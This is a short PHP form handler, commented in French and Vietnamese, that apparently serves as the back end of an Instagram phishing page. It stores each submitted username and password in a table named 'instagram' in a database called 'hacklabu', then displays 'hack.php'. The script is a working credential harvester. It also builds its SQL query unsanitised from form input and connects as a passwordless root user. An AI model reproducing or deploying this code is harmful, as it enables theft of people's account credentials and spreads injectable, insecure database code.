<?php
        
  if(isset($_POST['id']) 
  && isset($_POST['motdepass'])) {
    

    /* Les parametres de connexion a la base de donnees */
    $server= 'localhost';
    $login="root";
    $password="";
    $db="hacklabu";

    /*Recuperation des valeur apres envoi du formulaire*/
    $id=$_POST['id'];   
    $motdepass=$_POST['motdepass'];
    

    /*Creation de l'identifiant de connection*/
    if( $id_connection = mysqli_connect($server,$login,$password,$db)) {
      
      /*Creation de l'identifiant de la base de donnees*/
      if( $id_db = mysqli_select_db($id_connection, $db)) {		
                
        /*Saisir ici la requete SQL a executer*/
        $requet="INSERT INTO instagram (id, motdepass) 
                  VALUES ('$id', '$motdepass')";

        /*execution de la requette*/
        if($resultat=mysqli_query($id_connection,$requet)) {  
          $url='hack.php'; // tạo biến url cần lấy
          $lines_array=file($url); // dùng hàm file() lấy dữ liệu theo url
          $lines_string=implode('',$lines_array); // chuyển dữ liệu lấy được kiểu mảng thành một biến string
          echo $lines_string; // hiển thị dữ liệu
                    
        } else {
            echo "<p class=\"erreur\">Erreur de requete sur la base de donnees \"".$db."\".</p>";
        }
      } else {
          die("<p class=\"erreur\">Echec de connexion a la base de donnees \"".$db."\".</p>");
      }
        
      /*femeture de la connexion*/
      mysqli_close($id_connection);
    } else {
      die("<p class=\"erreur\">Echec de connexion au serveur de base de donnees \"".$server."\".</p>");
    }
  }

?>